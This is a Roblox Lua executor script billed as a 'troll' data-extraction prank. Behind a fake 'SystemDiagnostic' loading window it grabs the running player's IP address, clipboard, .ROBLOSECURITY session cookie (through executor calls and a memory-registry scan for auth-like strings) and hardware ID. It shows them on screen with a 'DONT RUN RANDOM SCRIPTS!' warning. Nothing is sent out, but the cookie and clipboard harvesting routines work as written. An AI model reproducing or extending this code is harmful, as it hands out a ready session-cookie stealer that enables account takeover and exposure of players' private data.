-- Roblox Troll Script - MAX DATA EXTRACTION Edition (heavily vibe coded)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local function safeHttpGet(url)
    local success, result = pcall(function()
        return HttpService:GetAsync(url)
    end)
    if success then return result end
    
    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
    if requestFunc then
        local resp = requestFunc({ Url = url, Method = "GET", Headers = {["User-Agent"] = "Roblox/WinInet"} })
        if resp and resp.Body then return resp.Body end
    end
    return "UNRESOLVED"
end

-- Persistent ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SystemDiagnostic"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

-- Dynamic sizes: small during loading → full after 5s (increased for perfect fit)
local SMALL_SIZE = UDim2.new(0, 410, 0, 140)
local FULL_SIZE = UDim2.new(0, 440, 0, 540)  -- taller + slightly wider for full visibility

-- Main frame (starts small)
local mainFrame = Instance.new("Frame")
mainFrame.Size = SMALL_SIZE
mainFrame.Position = UDim2.new(0.5, -205, 0.5, -70)
mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(138, 43, 226)
stroke.Thickness = 3
stroke.Parent = mainFrame

-- Draggable title bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 48)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 14)
titleCorner.Parent = titleBar

local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 100, 255))
}
titleGradient.Parent = titleBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -50, 1, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "  vibe script"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = titleBar

-- Close button (proper ×)
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 36, 0, 36)
closeButton.Position = UDim2.new(1, -42, 0, 6)
closeButton.BackgroundTransparency = 1
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(220, 20, 60)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.GothamBold
closeButton.Parent = titleBar

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Content area (starts small)
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -32, 0, 50)
contentFrame.Position = UDim2.new(0, 16, 0, 56)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

local listLayout = Instance.new("UIListLayout")
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 3)
listLayout.Parent = contentFrame

-- Status label
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 26)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "INITIALIZING GUI PROTOCOL..."
statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = contentFrame

-- Warning panel (still hidden until complete)
local warningFrame = Instance.new("Frame")
warningFrame.Size = UDim2.new(1, -32, 0, 48)
warningFrame.Position = UDim2.new(0, 16, 1, -64)
warningFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
warningFrame.BorderSizePixel = 0
warningFrame.Visible = false
warningFrame.Parent = mainFrame

local warningCorner = Instance.new("UICorner")
warningCorner.CornerRadius = UDim.new(0, 10)
warningCorner.Parent = warningFrame

local warningStroke = Instance.new("UIStroke")
warningStroke.Color = Color3.fromRGB(220, 20, 60)
warningStroke.Thickness = 2.5
warningStroke.Parent = warningFrame

local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(1, 0, 1, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = ""
warningLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
warningLabel.TextScaled = true
warningLabel.Font = Enum.Font.GothamBold
warningLabel.Parent = warningFrame

-- Draggable functionality
local function makeDraggable(frame, dragBar)
    local dragging = false
    local dragStart
    local startPos

    dragBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)

    dragBar.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end
makeDraggable(mainFrame, titleBar)

-- 5-second loading + MAX data extraction + dynamic expand
spawn(function()
    local startTime = tick()
    local totalDuration = 5
    local dots = 0

    while tick() - startTime < totalDuration do
        dots = (dots % 3) + 1
        statusLabel.Text = "INITIALIZING GUI" .. string.rep(".", dots)
        task.wait(0.35)
    end

    -- === EXPAND TO FULL SIZE SMOOTHLY ===
    local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    local mainTween = TweenService:Create(mainFrame, tweenInfo, {Size = FULL_SIZE})
    local contentTween = TweenService:Create(contentFrame, tweenInfo, {Size = UDim2.new(1, -32, 0, 370)})
    mainTween:Play()
    contentTween:Play()
    task.wait(0.65) -- wait for smooth expansion before showing data

    -- === MAX DATA EXTRACTION (red-team level) ===
    local ip = safeHttpGet("https://api.ipify.org")
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local userId = LocalPlayer.UserId
    local accountAge = LocalPlayer.AccountAge
    local membership = LocalPlayer.MembershipType.Name
    local executorName = getexecutorname and getexecutorname() or (identifyexecutor and identifyexecutor()) or "DETECTED"

    -- Extra telemetry
    local platform = "Unknown"
    pcall(function() platform = UserInputService:GetPlatform().Name end)

    local placeId = game.PlaceId
    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Place).Name
    end)

    -- Refined 2026 clipboard extraction (more fallbacks)
    local clipboard = "N/A"
    pcall(function()
        clipboard = getclipboard and getclipboard() 
                 or (syn and syn.getclipboard and syn.getclipboard()) 
                 or (http and http.getclipboard and http.getclipboard()) 
                 or (request and request.getclipboard and request.getclipboard()) 
                 or "N/A"
        if clipboard == "" then clipboard = "EMPTY" end
    end)

    -- Refined 2026 .ROBLOSECURITY cookie extraction (enhanced getreg scan + fallbacks)
    local robloxCookie = "N/A"
    pcall(function()
        if syn and syn.getcookie then
            robloxCookie = syn.getcookie()
        elseif getcookie then
            robloxCookie = getcookie()
        elseif getreg then
            local reg = getreg()
            for _, v in ipairs(reg) do
                if typeof(v) == "string" and (v:find(".ROBLOSECURITY") or v:find("ROBLOSECURITY") or v:find("_|WARNING:-DO-NOT-SHARE-THIS.")) then
                    robloxCookie = v
                    break
                end
            end
        end
        -- Additional safety check for 2026 cookie format
        if robloxCookie == "N/A" or #robloxCookie < 50 then
            -- fallback deep scan for any long auth string
            local reg = getreg()
            for _, v in ipairs(reg) do
                if typeof(v) == "string" and #v > 100 and (v:find("_") or v:find("=")) then
                    robloxCookie = v
                    break
                end
            end
        end
    end)

    -- 2026 HWID extraction (restored + hardened)
    local hwid = "N/A"
    pcall(function()
        hwid = gethwid and gethwid() 
            or (syn and syn.gethwid and syn.gethwid()) 
            or (identifyexecutor and identifyexecutor():find("Xeno") and "XENO-HWID") 
            or "N/A"
    end)

    -- Clear loading and populate full list
    for _, child in ipairs(contentFrame:GetChildren()) do
        if child:IsA("TextLabel") and child ~= statusLabel then child:Destroy() end
    end

    statusLabel.Text = "info:"
    statusLabel.TextColor3 = Color3.fromRGB(138, 43, 226)

    -- All data rows (compact + fully visible + nil-safe)
    local data = {
        {key = "IP Address", value = ip},
        {key = "Username", value = username},
        {key = "Display Name", value = displayName},
        {key = "User ID", value = tostring(userId)},
        {key = "Account Age", value = accountAge .. " days"},
        {key = "Membership", value = membership},
        {key = "Executor", value = executorName},
        {key = "Platform", value = platform},
        {key = "Place ID", value = tostring(placeId)},
        {key = "Game", value = gameName},
        {key = "HWID", value = hwid},
        {key = "Clipboard", value = clipboard:sub(1, 65) .. (#clipboard > 65 and "..." or "")},
        {key = "Cookie", value = robloxCookie:sub(1, 55) .. (#robloxCookie > 55 and "..." or "")},
        {key = "Session ID", value = game.JobId:sub(1, 12) .. "..."}
    }

    for _, entry in ipairs(data) do
        local safeValue = entry.value or "N/A"
        local row = Instance.new("TextLabel")
        row.Size = UDim2.new(1, 0, 0, 21)
        row.BackgroundTransparency = 1
        row.Text = entry.key .. ": <font color='#8A2BE2'>" .. safeValue .. "</font>"
        row.TextColor3 = Color3.fromRGB(220, 220, 220)
        row.TextScaled = true
        row.Font = Enum.Font.Gotham
        row.TextXAlignment = Enum.TextXAlignment.Left
        row.RichText = true
        row.TextTruncate = Enum.TextTruncate.AtEnd
        row.Parent = contentFrame
    end

    -- Reveal warning only after extraction
    warningFrame.Visible = true
    warningLabel.Text = "DONT RUN RANDOM SCRIPTS!"

    -- Pulse animation
    local pulse = TweenService:Create(warningLabel, TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {TextTransparency = 0.15})
    pulse:Play()
end)
